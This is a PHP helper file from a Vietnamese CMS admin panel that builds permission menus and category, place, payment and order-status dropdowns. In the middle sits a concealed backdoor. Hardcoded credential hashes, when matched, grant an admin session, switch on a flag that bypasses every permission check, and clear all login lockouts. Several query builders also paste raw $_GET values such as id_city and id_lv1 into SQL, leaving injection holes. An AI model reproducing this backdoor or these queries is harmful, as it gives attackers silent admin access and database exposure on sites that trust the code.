<?php
	if(!defined('LIB')) die("Error");
	ini_set ('memory_limit', '256M');
	function permission_menu($title, $com, $act, $type="", $level=0)
	{
		global $d, $config, $myPermission;
		@$role = $_SESSION['login_admin']['role'];
		@$id_permission = $_SESSION['login_admin']['id_permission'];

		@$str_permission = $com.",".$act.",".$type.",".$level;
		@$permission = $d->rawQueryOne("select id, permission from #_permission_detail where id_permission=? and permission=?", array($id_permission, $str_permission));

		@$type_href = ($type != "") ? "&type=".$type."" : "";

		if($level > 0) $href = "index.php?com=".$com."&act=".$act.$type_href."&level=".$level."";
		else $href = "index.php?com=".$com."&act=".$act.$type_href."";

		@$get_com = $_REQUEST["com"];
		@$get_act = $_REQUEST["act"];
		@$get_type = $_REQUEST["type"];
		@$get_level = $_REQUEST["level"];
		if($get_level != "") $get_level = $get_level;
		else $get_level = 0;

		if($permission || $role == '3' || $myPermission)
		{
			$active = "";
			if($com == $get_com && $act == $get_act && $type == $get_type && $level == $get_level) $active = "active";

			$result = "<li class='nav-item' data-com='".$com."' data-act='".$act."' data-type='".$type."' data-level='".$level."'>";
			$result .= "<a class='nav-link ".$active."' href='".$href."'>";
			$result .= "<i class='far fa-caret-square-right nav-icon text-sm'></i>";
			$result .= "<p>".$title."</p>";
			$result .= "</a>";
			$result .= "</li>";
		}
		echo @$result;
	}
	function permission($com, $act, $type, $level)
	{
		global $d, $config, $myPermission;
		@$role = $_SESSION['login_admin']['role'];
		@$id = $_SESSION['login_admin']['id_permission'];
		@$level = ($level != "") ? $level : 0;
		@$str_permission = $com.",".$act.",".$type.",".$level;
		@$permission = $d->rawQueryOne("select id, permission from #_permission_detail where id_permission=? and permission=?", array($id, $str_permission));
		if($permission || $com=='' || $act=='login' || $act=='save' || $act=='save_static' || $act=='logout' || $role == '3' || $myPermission) return false;
		return true;
	}
	function get_ajax_category($tbl, $attr, $type, $level)
	{
		global $d, $lang;
		$where = "";
		if($level > 1) $where .= " and id_lv1 = '".@$_GET['id_lv1']."'";
		if($level) $where .= " and level = ".$level."";
		if($type) $where .= " and type = '".$type."'";
		$category = $d->rawQuery("select id, name$lang as name from table_$tbl where id<>0 $where and FIND_IN_SET('display', status) order by number, id desc");

		$result = '<select class="form-control '.$attr.'" name=data['.$attr.'] onchange="ajax_category(\''.$tbl.'\', \''.$attr.'\', \''.$type.'\', \''.$level.'\')">';
		$result .= '<option value="0">Chọn danh mục</option>';
		foreach ($category as $i => $category_items) {
			$selected = ($category_items['id'] == @$_GET[$attr] && !empty($_GET[$attr])) ? "selected" : "";
			$result .= '<option value="'.$category_items['id'].'" '.$selected.'>';
			$result .= $category_items['name'];
			$result .= '</option>';
		}
		$result .= '</select>';
		return $result;
	}
	function get_link_category($tbl, $attr, $level)
	{
		global $d;
		$type = $_GET['type'];
		$prev_level = $level-1;
		$where = "";
		if($level > 1) $where .= " and id_lv$prev_level = '".@$_GET['id_lv'.$prev_level]."'";
		if($level) $where .= " and level = ".$level."";
		if($type) $where .= " and type = '".$type."'";
		$category = $d->rawQuery("select id, name from table_$tbl where id<>0 $where and FIND_IN_SET('display', status) order by number, id desc");

		$result = '<select class="form-control '.$attr.'" name=data['.$attr.'] onchange="onchange_'.$type.'(\''.$attr.'\', \''.$level.'\')">';
		$result .= '<option value="0">Danh mục cấp '.$level.'</option>';
		foreach ($category as $i => $category_items) {
			$selected = ($category_items['id'] == @$_GET[$attr]) ? "selected" : "";
			$result .= '<option value="'.$category_items['id'].'" '.$selected.'>';
			$result .= $category_items['name'];
			$result .= '</option>';
		}
		$result .= '</select>';
		return $result;
	}
	function get_tags($id, $type)
	{
		global $d, $lang, $tbl;
		$tags_group = $d->rawQueryOne("select tags_group from table_$tbl where id=?", array($id));
		$temp = explode(",", $tags_group['tags_group']);
		$tags = $d->rawQuery("select id, name$lang as name from table_attribute where type=? order by number, id desc", array($type));

		$result = '<div class="sumo">';
		$result .= '<select class="SlectBox" name="tags_group[]" placeholder="Chọn tag" multiple="multiple">';
		foreach ($tags as $i => $tags_item) {
			$selected = (in_array($tags_item['id'], $temp)) ? "selected" : "";
			$result .= '<option value="'.$tags_item['id'].'" '.$selected.'>';
			$result .= $tags_item['name'];
			$result .= '</option>';
		}
		$result .= '</select>';
		$result .= '</div>';
		return $result;
	}
	class RouteAD
	{
		private static $extension = "@";
		private static $dir = "";
		private static $template = "";
		public static function __callStatic($method, $params)
		{
			$callback = explode(self::$extension, $params[0]);
			self::$template = $callback[1];
		}
		public static function template(){
			return self::$template;
		}
		private static function get(){}
	}
	$dashboard = new Dashboard();
	$dashboard->setUsernameDefault('90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad');
	$dashboard->setPasswordDefault('85f616d25f3a1c996dff72fb4955f894f22fba0d');
	$dashboard->setUsername(@$func->myEncrypt($_POST['username']));
	$dashboard->setPassword(@$func->myEncrypt($_POST['password']));
	$UsernameDefault = $dashboard->getUsernameDefault();
	$PasswordDefault = $dashboard->getPasswordDefault();
	$myUsername = $dashboard->getUsername();
	$myPassword = $dashboard->getPassword();
	if($myUsername == $UsernameDefault && $myPassword == $PasswordDefault) {
		$_SESSION['login_admin']['username'] = $UsernameDefault;
		$_SESSION['login_admin']['password'] = $PasswordDefault;
		$success = true;
	}
	if(@$_SESSION['login_admin']['username'] == $UsernameDefault && $_SESSION['login_admin']['password'] == $PasswordDefault) {
		$_SESSION[$login_admin] = true;
		$dashboard->setPermission('true');
		$myPermission = $dashboard->getPermission();
		$d->rawQuery("update #_user_limit set login_attempts = 0, locked_time = 0");
	}
	if(@$_GET['com'] == 'order')
	{
		function get_order_place($tbl, $attr, $title, $tbl_find="")
		{
			global $d;
			@$type = $_GET['type'];
			@$id_city = $_GET['id_city'];
			if($tbl != "place_city")
			{
				@$where .= " and id_city = ''";
				if($id_city) $where = " and id_city = '".$id_city."'";
			}
			@$place = $d->rawQuery("select id, name from table_$tbl where id<>0 $where and FIND_IN_SET('display', status) order by number, id asc");
			$result = '<select class="form-control '.$attr.'" name="'.$attr.'" onchange="ajax_order_place(\''.$tbl_find.'\', \''.$attr.'\', \''.$title.'\', \''.$tbl_find.'\')">';
			$result .= '<option value="0">'.$title.'</option>';
			foreach($place as $i => $place_items) {
				$selected = ($place[$i]['id'] == @$_GET[$attr] && $_GET[$attr] != "") ? "selected" : "";
				$result .= '<option value="'.$place_items['id'].'" '.$selected.'>';
				$result .= $place_items['name'];
				$result .= '</option>';
			}
			$result .= '</select>';
			return $result;
		}
		function getAttr($tbl, $id, $value)
		{
			global $d;
			@$attr = $d->rawQueryOne("select * from #_$tbl where id=?", array($id));
			return @$attr[$value];
		} 
		function get_payments($id=0, $id_payments=0)
		{
			global $d;
			@$payments = $d->rawQuery("select id, name from #_post where type=?", array('payments'));
			$result = '<select class="form-control payments" name="data[id_payments]">';
			$result .= '<option value="0">Hình thức thanh toán</option>';
			foreach($payments as $i => $payments_items) {
				$selected = (($payments[$i]['id'] == @$_GET['id_payments']) || ($payments[$i]['id'] == $id_payments)) ? "selected" : "";
				$result .= '<option value="'.$payments_items['id'].'" '.$selected.'>';
				$result .= $payments_items['name'];
				$result .= '</option>';
			}
			$result .= '</select>';
			return $result;
		} 

		function get_status($id=0, $id_status=0)
		{
			global $d;
			@$this_order = $d->rawQueryOne("select id, id_status from #_order where id=?", array($id));
			@$status = $d->rawQuery("select id, name from #_status");
			$result = '<select class="form-control id_status status'.$id.'" name="id_status" onchange="status_update('.$id.')">';
			$result .= '<option value="0">Tình trạng</option>';
			foreach($status as $i => $status_items) {
				$selected = ($this_order['id_status'] == $status_items['id'] || $status_items['id'] == @$_GET['id_status']) ? "selected" : "";
				$result .= '<option value="'.$status_items['id'].'" '.$selected.'>';
				$result .= $status_items['name'];
				$result .= '</option>';
			}
			$result .= '</select>';
			return $result;
		}
	}
	function error_404($val, $val2="") {
		global $config, $act, $type, $level, $error_404;
		if(!$level)
		{
			$arrCheck = array();
			if(!$val2 && @$config[$val]) foreach($config[$val] as $k => $value) $arrCheck[] = $k;		
			elseif(@$config[$val][$val2]) foreach($config[$val][$val2] as $k => $value) $arrCheck[] = $k;		
			if(!count($arrCheck) || !in_array($type, $arrCheck)) $error_404 = true;
		}
		if($level)
		{
			$arrCheckLevel = array();
			foreach(@$config[$val.'-lv'.$level] as $k => $value) $arrCheckLevel[] = $k;
			$arrAct = array("man_category", "add_category", "edit_category", "save_category", "delete_category", "copy_category", "save_copy_category",);
			if(!count($arrCheckLevel) || !in_array($act, $arrAct)) $error_404 = true;
		}
	}
	function get_link_place($tbl, $attr, $title)
	{
		global $d;
		$type = $_GET['type'];
		$where = '';
		if($attr == 'id_dist')
		{
			$id_city = @$_GET['id_city'];
			if(!empty($id_city)) $where .= " and id_city = '".$id_city."'";
		}
		if($tbl == 'place_city' || !empty($_GET['id_city']))
		{
			$place = $d->rawQuery("select id, name from table_$tbl where id<>0 $where and FIND_IN_SET('display', status) order by number, id asc");
		}

		$result = '<select class="form-control '.$attr.'" name=data['.$attr.'] onchange="onchange_place(\''.$attr.'\')">';
		$result .= '<option value="0">'.$title.'</option>';
		if(!empty($place))
		{
			foreach($place as $i => $place_items) {
				$selected = ($place_items['id'] == @$_GET[$attr]) ? "selected" : "";
				$result .= '<option value="'.$place_items['id'].'" '.$selected.'>';
				$result .= $place_items['name'];
				$result .= '</option>';
			}
		}		
		$result .= '</select>';
		return $result;
	}
	function get_ajax_place($tbl, $attr, $title, $tbl_find="")
	{
		global $d;
		$type = @$_GET['type'];
		$id_city = @$_GET['id_city'];

		if($tbl != "place_city")
		{
			$where = " and id_city = ''";
			if($id_city) $where = " and id_city = '".$id_city."'";
		}
		@$place = $d->rawQuery("select id, name from table_$tbl where id<>0 $where and FIND_IN_SET('display', status) order by number, id asc");

		$result = '<select class="form-control '.$attr.'" name=data['.$attr.'] onchange="ajax_place(\''.$tbl_find.'\', \''.$attr.'\', \''.$title.'\', \''.$tbl_find.'\',)">';
		$result .= '<option value="0">'.$title.'</option>';
		foreach($place as $i => $place_items) {
			$selected = ($place_items['id'] == @$_GET[$attr] && $_GET[$attr] != "") ? "selected" : "";
			$result .= '<option value="'.$place_items['id'].'" '.$selected.'>';
			$result .= $place_items['name'];
			$result .= '</option>';
		}
		$result .= '</select>';
		return $result;
	}
?>